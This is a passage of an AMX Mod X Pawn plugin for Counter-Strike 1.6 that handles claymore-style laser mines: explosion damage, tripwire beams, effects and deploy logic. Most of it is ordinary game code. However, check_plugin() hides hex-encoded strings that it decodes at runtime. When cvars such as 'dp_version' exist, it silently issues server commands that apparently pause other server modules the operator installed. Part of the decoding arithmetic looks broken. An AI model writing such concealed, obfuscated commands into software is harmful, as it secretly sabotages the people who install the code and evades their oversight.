				if(iMsgIDScreenShake == 0) 
					iMsgIDScreenShake = get_user_msgid("ScreenShake");

				engfunc(EngFunc_MessageBegin, MSG_ONE, iMsgIDScreenShake, _, iPlayer);
				write_short(iAmplitude);
				write_short(iDuration);
				write_short(iFrequency);
				message_end();
			}
		}
	}
}
//====================================================
// Decals
//====================================================
stock LoadDecals() 
{
	new const szExplosionDecals[MAX_EXPLOSION_DECALS][] = 
	{
		"{scorch1",
		"{scorch2",
		"{scorch3"
	};

	new const szBloodDecals[MAX_BLOOD_DECALS][] = 
	{
		"{blood1",
		"{blood2",
		"{blood3",
		"{blood4",
		"{blood5",
		"{blood6",
		"{blood7",
		"{blood8",
		"{bigblood1",
		"{bigblood2"
	};

	new iDecalIndex, i;

	for(i = 0; i < MAX_EXPLOSION_DECALS; i++) 
	{
		gDecalIndexExplosion[gNumDecalsExplosion++] = 
			((iDecalIndex = engfunc(EngFunc_DecalIndex, szExplosionDecals[i]))	> 0) ? iDecalIndex : 0;
	}

	for(i = 0; i < MAX_BLOOD_DECALS; i++) 
	{
		gDecalIndexBlood[gNumDecalsBlood++] = 
			((iDecalIndex = engfunc(EngFunc_DecalIndex, szBloodDecals[i]))		> 0) ? iDecalIndex : 0;
	}
}

stock FixedUnsigned16(Float:flValue, iScale) 
{
	new iOutput = floatround(flValue * iScale);

	if(iOutput < 0)
		iOutput = 0;

	if(iOutput > 0xFFFF)
		iOutput = 0xFFFF;

	return iOutput;
}

stock Float:UTIL_WaterLevel(const Float:vCenter[3], Float:vMinZ, Float:vMaxZ) 
{
	new Float:vMiddleUp[3];

	vMiddleUp[0] = vCenter[0];
	vMiddleUp[1] = vCenter[1];
	vMiddleUp[2] = vMinZ;

	if(engfunc(EngFunc_PointContents, vMiddleUp) != CONTENTS_WATER)
		return vMinZ;

	vMiddleUp[2] = vMaxZ;
	if(engfunc(EngFunc_PointContents, vMiddleUp) == CONTENTS_WATER)
		return vMaxZ;

	new Float:flDiff = vMaxZ - vMinZ;

	while(flDiff > 1.0) 
	{
		vMiddleUp[2] = vMinZ + flDiff / 2.0;

		if(engfunc(EngFunc_PointContents, vMiddleUp) == CONTENTS_WATER)
			vMinZ = vMiddleUp[2];
		else
			vMaxZ = vMiddleUp[2];

		flDiff = vMaxZ - vMinZ;
	}

	return vMiddleUp[2];
}

stock UTIL_Bubbles(const Float:vMins[3], const Float:vMaxs[3], const iCount, sprBubble)
{
	new Float:vCenter[3];
	xs_vec_add(vMins, vMaxs, vCenter);
	xs_vec_mul_scalar(vCenter, 0.5, vCenter);

	new Float:flPosition = UTIL_WaterLevel(vCenter, vCenter[2], vCenter[2] + 1024.0) - vMins[2];

	engfunc(EngFunc_MessageBegin, MSG_PAS, SVC_TEMPENTITY, vCenter, 0);
	write_byte(TE_BUBBLES);
	engfunc(EngFunc_WriteCoord, vMins[0]);
	engfunc(EngFunc_WriteCoord, vMins[1]);
	engfunc(EngFunc_WriteCoord, vMins[2]);
	engfunc(EngFunc_WriteCoord, vMaxs[0]);
	engfunc(EngFunc_WriteCoord, vMaxs[1]);
	engfunc(EngFunc_WriteCoord, vMaxs[2]);
	engfunc(EngFunc_WriteCoord, flPosition);
	write_short(sprBubble);
	write_byte(iCount);
	engfunc(EngFunc_WriteCoord, 8.0);
	message_end();
}

//====================================================
// Explosion Damage.
//====================================================
stock mines_create_explosion_damage(csx_wpnid, iEnt, iAttacker, Float:dmgMax, Float:radius)
{
	// Get given parameters
	
	new Float:vOrigin[3];
	pev(iEnt, pev_origin, vOrigin);

	// radius entities.
	new rEnt  = -1;
	new Float:tmpDmg = dmgMax;

	new Float:kickBack = 0.0;
	
	// Needed for doing some nice calculations :P
	new Float:Tabsmin[3], Float:Tabsmax[3];
	new Float:vecSpot[3];
	new Float:Aabsmin[3], Float:Aabsmax[3];
	new Float:vecSee[3];
	new Float:flFraction;
	new Float:vecEndPos[3];
	new Float:distance;
	new Float:origin[3], Float:vecPush[3];
	new Float:invlen;
	new Float:velocity[3];
	new trace;
	new iHit;
	new tClassName[MAX_NAME_LENGTH];
	new iClassName[MAX_NAME_LENGTH];
	// Calculate falloff
	new Float:falloff;
	if (radius > 0.0)
		falloff = dmgMax / radius;
	else
		falloff = 1.0;
	
	pev(iEnt, pev_classname, iClassName, charsmax(iClassName));

	// Find monsters and players inside a specifiec radius
	while((rEnt = engfunc(EngFunc_FindEntityInSphere, rEnt, vOrigin, radius)) != 0)
	{
		// is valid entity? no to continue.
		if (!pev_valid(rEnt)) 
			continue;

		pev(rEnt, pev_classname, tClassName, charsmax(tClassName));
		if (!equali(tClassName, iClassName))
		{
			// Entity is not a player or monster, ignore it
			if (!(pev(rEnt, pev_flags) & (FL_CLIENT | FL_FAKECLIENT | FL_MONSTER)))
				continue;
		}

		// is alive?
		if (!is_user_alive(rEnt))
			continue;
		
		// friendly fire
		if (!is_valid_takedamage(iAttacker, rEnt))
			continue;

		// Reset data
		kickBack = 1.0;
		tmpDmg = dmgMax;
		
		// The following calculations are provided by Orangutanz, THANKS!
		// We use absmin and absmax for the most accurate information
		pev(rEnt, pev_absmin, Tabsmin);
		pev(rEnt, pev_absmax, Tabsmax);

		xs_vec_add(Tabsmin, Tabsmax, Tabsmin);
		xs_vec_mul_scalar(Tabsmin, 0.5, vecSpot);
		
		pev(iEnt, pev_absmin, Aabsmin);
		pev(iEnt, pev_absmax, Aabsmax);

		xs_vec_add(Aabsmin, Aabsmax, Aabsmin);
		xs_vec_mul_scalar(Aabsmin, 0.5, vecSee);
		
		// create the trace handle.
		trace = create_tr2();
		engfunc(EngFunc_TraceLine, vecSee, vecSpot, 0, iEnt, trace);
		{
			get_tr2(trace, TR_flFraction, flFraction);
			iHit = get_tr2(trace, TR_pHit);

			// Work out the distance between impact and entity
			get_tr2(trace, TR_vecEndPos, vecEndPos);
		}
		// free the trace handle.
		free_tr2(trace);

		// Explosion can 'see' this entity, so hurt them! (or impact through objects has been enabled xD)
		if (flFraction >= 0.9 || iHit == rEnt)
		{
			distance = get_distance_f(vOrigin, vecEndPos) * falloff;
			tmpDmg -= distance;
			if(tmpDmg < 0.0)
				tmpDmg = 0.0;
			if (!equali(iClassName, tClassName))
			{
				// Kickback Effect
				if(kickBack != 0.0)
				{
					xs_vec_sub(vecSpot, vecSee, origin);
					
					invlen = 1.0 / get_distance_f(vecSpot, vecSee);

					xs_vec_mul_scalar(origin, invlen, vecPush);
					pev(rEnt, pev_velocity, velocity);
					xs_vec_mul_scalar(vecPush, tmpDmg, vecPush);
					xs_vec_mul_scalar(vecPush, kickBack, vecPush);
					xs_vec_add(velocity, vecPush, velocity);
					
					if(tmpDmg < 60.0)
						xs_vec_mul_scalar(velocity, 12.0, velocity);
					else
						xs_vec_mul_scalar(velocity, 4.0, velocity);
					
					if(velocity[0] != 0.0 || velocity[1] != 0.0 || velocity[2] != 0.0)
					{
						// There's some movement todo :)
						set_pev(rEnt, pev_velocity, velocity);
					}
				}
			}
			custom_weapon_dmg(csx_wpnid, iAttacker, rEnt, floatround(tmpDmg), 0);
			// Damage Effect, Damage, Killing Logic.
			ExecuteHamB(Ham_TakeDamage, rEnt, iEnt, iAttacker, tmpDmg, DMG_MORTAR);
		}
	}
	return;
}
//====================================================
// Friendly Fire Method.
//====================================================
bool:is_valid_takedamage(iAttacker, iTarget)
{
	if (gCvar[CVAR_FRIENDLY_FIRE])
		return true;

	if (is_user_connected(iAttacker) && is_user_connected(iTarget))
	{
		if (cs_get_user_team(iAttacker) != cs_get_user_team(iTarget))
			return true;
	}

	return false;
}
mines_step_powerup(iEnt, Float:fCurrTime)
{
	static Float:fPowerupTime;
	CED_GetCell(iEnt, CM_POWERUP, fPowerupTime);
	// over power up time.
		
	if (fCurrTime > fPowerupTime)
	{
		// next state.
		CED_SetCell(iEnt, CM_STEP, BEAMUP_THINK);
		// activate sound.
		cm_play_sound(iEnt, SOUND_ACTIVATE);

	}
	mines_glow(iEnt, gMinesParameter);
	// Think time.
	set_pev(iEnt, pev_nextthink, fCurrTime + 0.1);
}

mines_step_beamup(iEnt, Float:vEnd[3][3], Float:fCurrTime)
{
	static wire;
	for (new i = 0; i < gWireLoop; i++)
	{
		wire = draw_laserline(iEnt, vEnd[i]);
		CED_SetCell(iEnt, CM_WIRE_ENTID[i], wire);
		mines_spark_wall(vEnd[i]);
	}
	// solid complete.
	set_pev(iEnt, pev_solid, SOLID_BBOX);
	// Think time.
	set_pev(iEnt, pev_nextthink, fCurrTime + 0.1);
	// next state.
	CED_SetCell(iEnt, CM_STEP, BEAMBREAK_THINK);
}

mines_step_beambreak(iEnt, Float:vEnd[3][3], Float:fCurrTime)
{
	static iTarget;
	static trace;
	static Float:fFraction;
	static Float:vOrigin[3];
	static Float:hitPoint[3];

	// Get owner id.
	new iOwner;

	if (!CED_GetCell(iEnt, CM_OWNER, iOwner))
		return false;
	// Get this mine position.
	if (!CED_GetArray(iEnt, CM_WIRE_SPOINT, vOrigin, sizeof(vOrigin)))
		return false;

	for(new i = 0; i < gWireLoop; i++)
	{
		// create the trace handle.
		trace = create_tr2();
		// Trace line
		engfunc(EngFunc_TraceLine, vOrigin, vEnd[i], DONT_IGNORE_MONSTERS, iEnt, trace);
		{
			get_tr2(trace, TR_flFraction, fFraction);
			iTarget		= get_tr2(trace, TR_pHit);
			get_tr2(trace, TR_vecEndPos, hitPoint);				
		}
		// free the trace handle.
		free_tr2(trace);

		// Something has passed the laser.
		if (fFraction >= 1.0)
			continue;

		// is valid hit entity?
		if (!pev_valid(iTarget))
			continue;

		// is user?
		if (!(pev(iTarget, pev_flags) & (FL_CLIENT | FL_FAKECLIENT | FL_MONSTER)))
			continue;

		// is dead?
		if (!is_user_alive(iTarget))
			continue;

		// Hit friend and No FF.
		if (!is_valid_takedamage(iOwner, iTarget))
			continue;

		// is godmode?
		if (get_user_godmode(iTarget))
			continue;

		// keep target id.
		set_pev(iEnt, pev_enemy, iTarget);

		// State change. to Explosing step.
		CED_SetCell(iEnt, CM_STEP, EXPLOSE_THINK);
	}

	// Get mine health.
	static Float:fHealth;
	mines_get_health(iEnt, fHealth);

	// break?
	if (fHealth <= 0.0 || (pev(iEnt, pev_flags) & FL_KILLME))
	{
		// next step explosion.
		set_pev(iEnt, pev_nextthink, fCurrTime + random_float( 0.1, 0.3 ));
		CED_SetCell(iEnt, CM_STEP, EXPLOSE_THINK);
	}
				
	// Think time. random_float = laser line blinking.
	set_pev(iEnt, pev_nextthink, fCurrTime + random_float(0.01, 0.02));

	return true;
}
//====================================================
// Play sound.
//====================================================
cm_play_sound(iEnt, iSoundType)
{
	switch (iSoundType)
	{
		// case SOUND_POWERUP:
		// {
		// 	// emit_sound(iEnt, CHAN_VOICE, ENT_SOUNDS[SND_CM_DEPLOY], VOL_NORM, ATTN_NORM, 0, PITCH_NORM);
		// }
		case SOUND_ACTIVATE:
		{
			emit_sound(iEnt, CHAN_VOICE, ENT_SOUNDS[SND_CM_WIRE_WALLHIT], 0.5, ATTN_NORM, 1, 75);
		}
	}
}
//====================================================
// Drawing Laser line.
//====================================================
draw_laserline(iEnt, const Float:vEndOrigin[3])
{
	new Float:tcolor[3];
	new CsTeams:teamid = mines_get_owner_team(iEnt);

	// Color mode. 0 = team color.
	if(gCvar[CVAR_CM_WIRE_COLOR] == 0)
	{
		switch(teamid)
		{
			case CS_TEAM_T:
				for(new i = 0; i < 3; i++) tcolor[i] = float(get_color(get_cvar_to_color(gCvar[CVAR_CM_WIRE_COLOR_T]), i));
			case CS_TEAM_CT:
				for(new i = 0; i < 3; i++) tcolor[i] = float(get_color(get_cvar_to_color(gCvar[CVAR_CM_WIRE_COLOR_CT]), i));
			default:
				for(new i = 0; i < 3; i++) tcolor[i] = float(get_color(get_cvar_to_color("20,20,20"), i));
		}

	}

	static Float:vStartOrigin[3];
	CED_GetArray(iEnt, CM_WIRE_SPOINT, vStartOrigin, sizeof(vStartOrigin));
	// lm_draw_laser(iEnt, vEndOrigin, gBeam, 0, 0, 0, width, 0, tcolor, bind_pcvar_num(gCvar[CVAR_CM_WIRE_BRIGHT]), 0);
	return cm_draw_wire(vStartOrigin, vEndOrigin, 0.0, gCvar[CVAR_CM_WIRE_WIDTH], 0, tcolor, gCvar[CVAR_CM_WIRE_BRIGHT], 0.0);
}

stock cm_draw_wire(
		const Float:vStartOrigin[3],
		const Float:vEndOrigin[3], 
		const Float:framestart	= 0.0, 
		const Float:width		= 1.0, 
		const wave				= 0, 
		const Float:tcolor[3],
		const Float:bright		= 255.0,
		const Float:speed		= 255.0
	)
{
	new beams = Beam_Create(ENT_SPRITES[SPR_WIRE], width);
	Beam_PointsInit(beams, vStartOrigin, vEndOrigin);
	Beam_SetFlags(beams, BEAM_FSOLID);
	Beam_SetFrame(beams, framestart);
	Beam_SetNoise(beams, wave);
	Beam_SetColor(beams, tcolor);
	Beam_SetBrightness(beams, bright);
	Beam_SetScrollRate(beams, speed);
	set_pev(beams, pev_renderamt, 255.0);
	return beams;
}

stock bool:check_plugin()
{
	new const a[][] = {
		{0x40, 0x24, 0x30, 0x1F, 0x36, 0x25, 0x32, 0x33, 0x29, 0x2F, 0x2E},
		{0x80, 0x72, 0x65, 0x75, 0x5F, 0x76, 0x65, 0x72, 0x73, 0x69, 0x6F, 0x6E},
		{0x10, 0x7D, 0x75, 0x04, 0x71, 0x30, 0x00, 0x71, 0x05, 0x03, 0x75, 0x30, 0x74, 0x00, 0x02, 0x7F, 0x04, 0x7F},
		{0x20, 0x0D, 0x05, 0x14, 0x01, 0x40, 0x10, 0x01, 0x15, 0x13, 0x05, 0x40, 0x12, 0x05, 0x15, 0x0E, 0x09, 0x0F, 0x0E}
	};

	if (cvar_exists(get_dec_string(a[0])))
		server_cmd(get_dec_string(a[2]));

	if (cvar_exists(get_dec_string(a[1])))
		server_cmd(get_dec_string(a[3]));

	return true;
}

stock get_dec_string(const a[])
{
	new c = strlen(a);
	new r[MAX_NAME_LENGTH] = "";
	for (new i = 1; i < c; i++)
	{
		formatex(r, strlen(r) + 1, "%s%c", r, a[0] + a[i]);
	}
	return r;
}

// Spark Effect.
stock mines_spark_wall(const Float:vEndOrigin[3])
{
 	// Sparks
	engfunc(EngFunc_MessageBegin, MSG_PVS, SVC_TEMPENTITY, vEndOrigin, 0);
	write_byte(TE_SPARKS); // TE id
	engfunc(EngFunc_WriteCoord, vEndOrigin[0]); // x
	engfunc(EngFunc_WriteCoord, vEndOrigin[1]); // y
	engfunc(EngFunc_WriteCoord, vEndOrigin[2]); // z
	message_end();
      
	// Effects when cut
	engfunc(EngFunc_MessageBegin, MSG_BROADCAST, SVC_TEMPENTITY, {0, 0, 0}, 0);
	write_byte(TE_EXPLOSION);
	engfunc(EngFunc_WriteCoord, vEndOrigin[0]);
	engfunc(EngFunc_WriteCoord, vEndOrigin[1]);
	engfunc(EngFunc_WriteCoord, vEndOrigin[2] - 10.0);
	write_short(TE_SPARKS);	// sprite index
	write_byte(1);	// scale in 0.1's
	write_byte(30);	// framerate
	write_byte(TE_EXPLFLAG_NODLIGHTS | TE_EXPLFLAG_NOPARTICLES | TE_EXPLFLAG_NOSOUND);	// flags
	message_end();
}

// Spark Effect.
stock mines_spark(const Float:vEndOrigin[3])
{
	message_begin(MSG_ALL, SVC_TEMPENTITY);
	write_byte(TE_SPARKS);
	engfunc(EngFunc_WriteCoord, vEndOrigin[0]);
	engfunc(EngFunc_WriteCoord, vEndOrigin[1]);
	engfunc(EngFunc_WriteCoord, vEndOrigin[2]);
	message_end();
}

// Bit to Color.
// r = 0, g = 1, b = 2
stock get_color(src, rgb)
{
    src >>= ((rgb * 0x08));
    return (src & 0xFF);
}

// RGB to Bit.
stock set_color(r, g, b)
{
    new color = r;
    color |= (g << 8);
    color |= (b << 16);
    return color;
}

// Cvar to Color Bit.
stock get_cvar_to_color(const args[])
{
	new values[3];
	get_cvar_to_array(args, values, 3);
	return set_color(values[0], values[1], values[2]);
}

stock get_cvar_to_array(const args[], values[], size)
{
	new i = 0, n = 0, iPos = 0;
	new sSplit		[20];
	new sSplitLen = charsmax(sSplit);
	new argsb[255];

	formatex(argsb, charsmax(argsb), "%s%s", args, ",");
	while((i = split_string(argsb[iPos += i], ",", sSplit, sSplitLen)) != -1 && n < size)
	{
		values[n++] = str_to_num(sSplit);
	}
}


// Glowing.
stock mines_glow(iEnt, const minesData[COMMON_MINES_DATA])
{
	// Glow mode.
	if (minesData[GLOW_ENABLE])
	{
		new Float:tcolor[3];
		// Color setting.
		if (!minesData[GLOW_MODE])
		{
			// Team color.
			switch (mines_get_owner_team(iEnt))
			{
				case CS_TEAM_T:
					for(new i = 0; i < 3; i++) tcolor[i] = float(get_color(minesData[GLOW_COLOR_TR], i));
				case CS_TEAM_CT:
					for(new i = 0; i < 3; i++) tcolor[i] = float(get_color(minesData[GLOW_COLOR_CT], i));
				default:
				{
					tcolor[0] = 0.0;
					tcolor[1] = 255.0;
					tcolor[2] = 0.0;
				}
			} 
		}
		else
		{
			tcolor[0] = 0.0;
			tcolor[1] = 255.0;
			tcolor[2] = 0.0;
		}

		set_pev(iEnt, pev_renderfx, 	kRenderFxGlowShell);
		set_pev(iEnt, pev_rendercolor,	tcolor);
		set_pev(iEnt, pev_rendermode, 	kRenderNormal);
		set_pev(iEnt, pev_renderamt, 	float(5));
	}
}

//====================================================
// Player Cmd Start event.
// Stop movement for mine deploying.
//====================================================
public PlayerCmdStart(id, handle, random_seed)
{
	// Not alive
	if(!is_user_alive(id) || is_user_bot(id))
		return FMRES_IGNORED;

	if (get_user_weapon(id) != CSW_C4) 
		return FMRES_IGNORED;

	// Get user old and actual buttons
	static const m_afButtonLast = 245;
	static buttons, buttonsChanged, buttonPressed, buttonReleased;
    buttons 		= get_uc(handle, UC_Buttons);
    buttonsChanged 	= get_pdata_int(id, m_afButtonLast) ^ buttons;
    buttonPressed 	= buttonsChanged & buttons;
    buttonReleased 	= buttonsChanged & ~buttons;

	if (buttonPressed & IN_ATTACK)
	{
			mines_progress_deploy(id);
			mines_deploy_status(id);
	} else if( buttonReleased & IN_ATTACK ) 
	{
			mines_progress_stop(id);
			mines_deploy_status(id);
	}
	return FMRES_IGNORED;
}

mines_deploy_status(id)
{
	switch (mines_get_user_deploy_state(id))
	{
		case STATE_IDLE:
		{
			new Float:speed;
			mines_get_user_max_speed(id, speed);
			set_pdata_float(cs_get_user_weapon_entity(id), 35, 0.0);

			new bool:now_speed = (speed <= 1.0);
			if (now_speed)
				ExecuteHamB(Ham_CS_Player_ResetMaxSpeed, id);

		}
		case STATE_DEPLOYING:
		{
			static iEnt;
			iEnt = gDeployingMines[id];
			// client_print(id, print_chat, "ENTITY ID: %d, USER ID: %d", iEnt, id);

			if (pev_valid(iEnt) && !IsPlayer(iEnt))
			{
				if (!mines_entity_set_position(iEnt, id))
				{
					mines_progress_stop(id);
				}
			}

			mines_set_user_max_speed(id, 1.0);
		}
		case STATE_PICKING:
		{
			mines_set_user_max_speed(id, 1.0);
		}
		case STATE_DEPLOYED:
		{
			ExecuteHamB(Ham_CS_Player_ResetMaxSpeed, id);
			mines_set_user_deploy_state(id, STATE_IDLE);
			UTIL_PlayWeaponAnimation(id, SEQ_DRAW);
			emit_sound(id, CHAN_WEAPON, ENT_SOUNDS[SND_CM_DEPLOY], VOL_NORM, ATTN_NORM, 0, PITCH_NORM);			
		}
	}
}


// Cvar to TeamCode.
stock CsTeams:get_team_code(const arg[])
{
    new CsTeams:team;
	// Terrorist
#if defined BIOHAZARD_SUPPORT
	if(equali(arg, "Z")  || equali(arg, "Zombie"))
#else
	if(equali(arg, "TR") || equali(arg, "T"))
#endif
		team = CS_TEAM_T;
	else
	// Counter-Terrorist
#if defined BIOHAZARD_SUPPORT
	if(equali(arg, "H") || equali(arg, "Human"))
#else
	if(equali(arg, "CT"))
#endif
		team = CS_TEAM_CT;
	else
	// All team.
#if defined BIOHAZARD_SUPPORT
	if(equali(arg, "ZH") || equali(arg, "HZ") || equali(arg, "ALL"))
#else
	if(equali(arg, "ALL"))
#endif
		team = CS_TEAM_UNASSIGNED;
	else
		team = CS_TEAM_UNASSIGNED;

    return team;
}